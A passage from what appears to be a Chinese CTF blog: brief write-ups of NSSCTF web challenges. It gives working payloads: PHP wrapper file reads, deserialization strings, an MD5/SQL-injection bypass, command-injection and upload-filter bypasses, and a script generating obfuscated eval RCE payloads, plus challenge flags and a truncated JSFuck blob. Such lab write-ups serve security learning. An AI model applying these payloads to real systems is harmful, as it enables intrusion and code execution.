name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;panda&quot; /&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;    &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt;\n\n用来提交我们的payload,抓包,提交payload\n\n由于请求后，session会立刻被清空覆盖,发到爆破模块发送NULL payload即可\n然后1.php就会被修改为\n\n拿到shell后直接读flag即可\n","categories":["session 反序列化 php"],"tags":["session 反序列化"]},{"title":"nssctf写题日记","url":"/2025/09/10/nssctf/","content":"nssctf[第五空间 2021]WebFTP扫目录得到.git文件,发现存在config文件夹,发现存在phpinfo.php,访问得到flag\n\n\nNSSCTF&#123;523bbf70-90f8-4d24-b698-afe62065324a&#125;\n\n[LitCTF 2023]PHP是世界上最好的语言！！右边写rce就行\nNSSCTF&#123;6b69b03c-cc50-409c-b3a8-7221eb6968dc&#125;\n\n[LitCTF 2023]我Flag呢？\n\nNSSCTF&#123;9fbe5ec2-8489-45a5-95c3-7d812b136061&#125;\n\n[SWPUCTF 2021 ]caidao\n蚁剑就行,flag在根目录\n\nNSSCTF&#123;dd5ca420-ef4b-4dca-9282-cba263ab6772&#125;\n\n[SWPUCTF 2021 ]Do_you_know_http\n改ua头为WLLM即可,到下一关\n\n改referer为127.0.0.1即可,试了不行,改xff为127.0.0.1就行了\n\nNSSCTF&#123;5fc1788d-4c64-4643-bd36-730437e76d6a&#125;\n\n[SWPUCTF 2021 ]easyupload2.0传phtml即可,不浪费时间\n\nNSSCTF&#123;ad299558-a3d9-43da-b700-095613e9fcf4&#125;\n\n[SWPUCTF 2021 ]easyupload1.0抓包改mime为image&#x2F;jpeg即可\n\nWLLMCTF&#123;I_d0nt_w4nna_wak3up&#125;\n\nflag在环境变量里\n\nNSSCTF&#123;9043613f-14aa-42f3-b33f-83e1dce3c0e9&#125;\n\n[LitCTF 2023]导弹迷踪发现有game.js,打开即得flag\n\n\nNSSCTF&#123;y0u_w1n_th1s_!!!&#125;\n\n[SWPUCTF 2021 ]PseudoProtocolshint is hear Can you find out the hint.php?\nhttp://node7.anna.nssctf.cn:29272/index.php?wllm=php://filter/read=convert.base64-encode/resource=hint.php\n\n得到\nPD9waHANCi8vZ28gdG8gL3Rlc3QyMjIyMjIyMjIyMjIyLnBocA0KPz4=&lt;?php//go to /test2222222222222.php?&gt;\n\n访问得到\n&lt;?phpini_set(&quot;max_execution_time&quot;, &quot;180&quot;);show_source(__FILE__);include(&#x27;flag.php&#x27;);$a= $_GET[&quot;a&quot;];if(isset($a)&amp;&amp;(file_get_contents($a,&#x27;r&#x27;)) === &#x27;I want flag&#x27;)&#123;    echo &quot;success\\n&quot;;    echo $flag;&#125;?&gt;\n\nphp:&#x2F;&#x2F;input写入 I want flag得到flag\n\n或者使用\n?a=data://text/plain,I want flag\n\nNSSCTF&#123;00bca5ac-7378-4d18-b083-fd2cc0875472&#125;\n\n[SWPUCTF 2021 ]no_wakeup&lt;?phpheader(&quot;Content-type:text/html;charset=utf-8&quot;);error_reporting(0);show_source(&quot;class.php&quot;);class HaHaHa&#123;        public $admin;        public $passwd;        public function __construct()&#123;            $this-&gt;admin =&quot;user&quot;;            $this-&gt;passwd = &quot;123456&quot;;        &#125;        public function __wakeup()&#123;            $this-&gt;passwd = sha1($this-&gt;passwd);        &#125;        public function __destruct()&#123;            if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;wllm&quot;)&#123;                include(&quot;flag.php&quot;);                echo $flag;            &#125;else&#123;                echo $this-&gt;passwd;                echo &quot;No wake up&quot;;            &#125;        &#125;    &#125;$Letmeseesee = $_GET[&#x27;p&#x27;];unserialize($Letmeseesee);?&gt;\n\n序列化字符串改一下对象属性个数就行\n&lt;?phpclass HaHaHa&#123;        public $admin;        public $passwd;        public function __construct()&#123;            $this-&gt;admin =&quot;admin&quot;;            $this-&gt;passwd = &quot;wllm&quot;;        &#125;    &#125;$a = new HaHaHa();echo serialize($a);?&gt;\n\nO:6:&quot;HaHaHa&quot;:3:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:4:&quot;wllm&quot;;&#125; //原来是2改为3\n\n\nNSSCTF&#123;5efb832a-30a5-478a-ba1b-6dacd265090d&#125;\n\n[LitCTF 2023]Follow me and hack me\n\nNSSCTF&#123;f3140228-a555-4eec-aac2-5eab8d9127d0&#125;\n\n[NCTF 2018]签到题抓index.php查看返回包即可\n\nflag&#123;w3lc0m3_t0_nctf2018hhhhhhhhhhhh&#125;\n\n[LitCTF 2023]Pingping127.0.0.1然后抓包,在command后加管道符\n\n\n\nNSSCTF&#123;79672859-7f29-4f87-b82f-376d9f270e9d&#125;\n\n14.[SWPUCTF 2021 ]hardrce&lt;?phpheader(&quot;Content-Type:text/html;charset=utf-8&quot;);error_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#x27;wllm&#x27;]))&#123;    $wllm = $_GET[&#x27;wllm&#x27;];    $blacklist = [&#x27; &#x27;,&#x27;\\t&#x27;,&#x27;\\r&#x27;,&#x27;\\n&#x27;,&#x27;\\+&#x27;,&#x27;\\[&#x27;,&#x27;\\^&#x27;,&#x27;\\]&#x27;,&#x27;\\&quot;&#x27;,&#x27;\\-&#x27;,&#x27;\\$&#x27;,&#x27;\\*&#x27;,&#x27;\\?&#x27;,&#x27;\\&lt;&#x27;,&#x27;\\&gt;&#x27;,&#x27;\\=&#x27;,&#x27;\\`&#x27;,];    foreach ($blacklist as $blackitem)    &#123;        if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $wllm)) &#123;        die(&quot;LTLT说不能用这些奇奇怪怪的符号哦！&quot;);    &#125;&#125;if(preg_match(&#x27;/[a-zA-Z]/is&#x27;,$wllm))&#123;    die(&quot;Ra&#x27;s Al Ghul说不能用字母哦！&quot;);&#125;echo &quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;;eval($wllm);&#125;else&#123;    echo &quot;蔡总说：注意审题！！！&quot;;&#125;?&gt;\n\n使用取反脚本\n#!/usr/bin/env python# -*- coding: UTF-8 -*-&quot;&quot;&quot;@Project :PythonProject @File    ：取反脚本.py@IDE     :PyCharm @Author  :DY19sec@Date    :2025/4/20 13:12 &quot;&quot;&quot;import urllib.parse as urlparse# 获取用户输入的函数名和命令system = input(&#x27;[+]your function: &#x27;).replace(&#x27;\\r\\n&#x27;, &#x27;&#x27;).replace(&#x27;\\r&#x27;, &#x27;&#x27;).replace(&#x27;\\n&#x27;, &#x27;&#x27;)command = input(&#x27;[+]your command: &#x27;).replace(&#x27;\\r\\n&#x27;, &#x27;&#x27;).replace(&#x27;\\r&#x27;, &#x27;&#x27;).replace(&#x27;\\n&#x27;, &#x27;&#x27;)# 按位取反并转换为字节def invert_to_bytes(s):    return bytes([(~ord(c)) &amp; 0xFF for c in s])# 生成URL编码后的字符串encoded_system = urlparse.quote(invert_to_bytes(system))encoded_command = urlparse.quote(invert_to_bytes(command))# 输出最终结果print(f&#x27;[*] (~&#123;encoded_system&#125;)(~&#123;encoded_command&#125;);&#x27;)\n\n\n\nNSSCTF&#123;59931241-37d1-4c25-b575-0c04d47feb6c&#125;\n\n[BJDCTF 2020]easy_md5\n抓包得到信息\nselect * from &#x27;admin&#x27; where password=md5($pass,true)\n\n此处使用ffifdyop万能密码绕过。ffifdyop的MD5加密结果是276f722736c95d99e921722cf9ed621c，经过MySQL编码后会变成’or’6xxx,使SQL恒成立,相当于万能密码,可以绕过md5()函数的加密\n进入下一关,源码得到hint\n$a = $GET[&#x27;a&#x27;];$b = $_GET[&#x27;b&#x27;];if($a != $b &amp;&amp; md5($a) == md5($b))&#123;    header(&#x27;Location: levell14.php&#x27;);\n\nQNKCDZO240610708s878926199as155964671as214587387as214587387a挑两个上去\n\n下一关:\n&lt;?phperror_reporting(0);include &quot;flag.php&quot;;highlight_file(__FILE__);if($_POST[&#x27;param1&#x27;]!==$_POST[&#x27;param2&#x27;]&amp;&amp;md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;]))&#123;    echo $flag;&#125;\n\n数组绕过\nparam1[]=1&amp;param2[]=2\n\n\nNSSCTF&#123;e6cd9dd7-f3ea-4215-bac8-6078fb8a7116&#125;\n\n[NSSCTF 2022 Spring Recruit]ezgame前端有一个preload.js看看\n\nNSSCTF&#123;db5bc963-8bca-4c4c-b3ad-4bf678761cde&#125;\n\n[suctf 2019]EasySQL手动fuzz,一般的联合注入,报错注入都没有用,尝试一下堆叠注入发现可行,version();1正常回显\n*,1\n\n\nNSSCTF&#123;fe616752-38e6-48b7-bf05-bae4207c9eb9&#125;\n\n[GXYCTF 2019]Ping Ping Ping[SWPUCTF 2022 ]ez_ez_php&lt;?phperror_reporting(0);if (isset($_GET[&#x27;file&#x27;])) &#123;    if ( substr($_GET[&quot;file&quot;], 0, 3) === &quot;php&quot; ) &#123;        echo &quot;Nice!!!&quot;;        include($_GET[&quot;file&quot;]);    &#125;     else &#123;        echo &quot;Hacker!!&quot;;    &#125;&#125;else &#123;    highlight_file(__FILE__);&#125;//flag.php\n\n?file=php://filter/resource=flag.php\n\n回显如下:\nNice!!!NSSCTF&#123;flag_is_not_here&#125;real_flag_is_in_&#x27;flag&#x27;鎹釜鎬濊矾锛岃瘯璇昉HP浼崗璁憿\n\n\nNSSCTF&#123;224ead8f-72ef-4e59-8eca-c6955d7b4d2a&#125;\n\n[ZJCTF 2019]NiZhuanSiWei&lt;?php  $text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123;    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;    if(preg_match(&quot;/flag/&quot;,$file))&#123;        echo &quot;Not now!&quot;;        exit();     &#125;else&#123;        include($file);  //useless.php        $password = unserialize($password);        echo $password;    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;\n\n这个先用php:&#x2F;&#x2F;input写入即可,然后再读useless.php的内容\n?text=data://text/plain,welcome to the zjctf&amp;file=php://filter/read=convert.base64-encode/resource=useless.phpPOSTwelcome to zjctf\n\n\n解码得到\n&lt;?php  class Flag&#123;  //flag.php      public $file;      public function __tostring()&#123;          if(isset($this-&gt;file))&#123;              echo file_get_contents($this-&gt;file);             echo &quot;&lt;br&gt;&quot;;        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);        &#125;      &#125;  &#125;$password = unserialize($password);echo $password;?&gt;  \n\n已经有echo,tostring自己会触发\nO:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;\n\n?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;\n\n\nNSSCTF&#123;2186140d-c1a9-463c-bdc3-03cf2f56d9a3&#125;\n\n[SWPUCTF 2021 ]errorsqlmap一把梭\n\nNSSCTF&#123;8134250c-a5ad-4f6a-baab-54b780be6ecd&#125;\n\n[SWPUCTF 2021 ]easyupload3.0\n发现中间件是Apache,先传.htaccess,然后传1.jpg即可\n\nNSSCTF&#123;66aab468-488d-440f-915f-617037679ca9&#125;\n\n[LitCTF 2023]1zjs\n看这个js文件和php文件\n(+[![]]+[])[+[]]+(+[]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+[]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]())[!+[]+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]]((+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[+!+[]])+(![]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]])()())[!+[]+!+[]+!+[]+[+[]]]+(+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+[]]]+[+[]]+[]+(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[]+[+!+[]]+[]+(![]+[])[+[]]+[+[]]+[]+[+[]]+[]+(+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[]+(![]+[])[+[]]+(+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[]+[!+[]+!+[]]+[]+[+!+[]]+[]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[]+(+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+(![]+[])[+!+[]]+[!+[]+!+[]+!+[]]+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[]+(!![]+[])[!+[]+!+[]+!+[]]+(+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[]+(![]+[])[+[]]+([][[]]+[])[!+[]+!+[]]+(![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[]+(![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]]((+((+(+!+[]+[+!+[]]+(!![]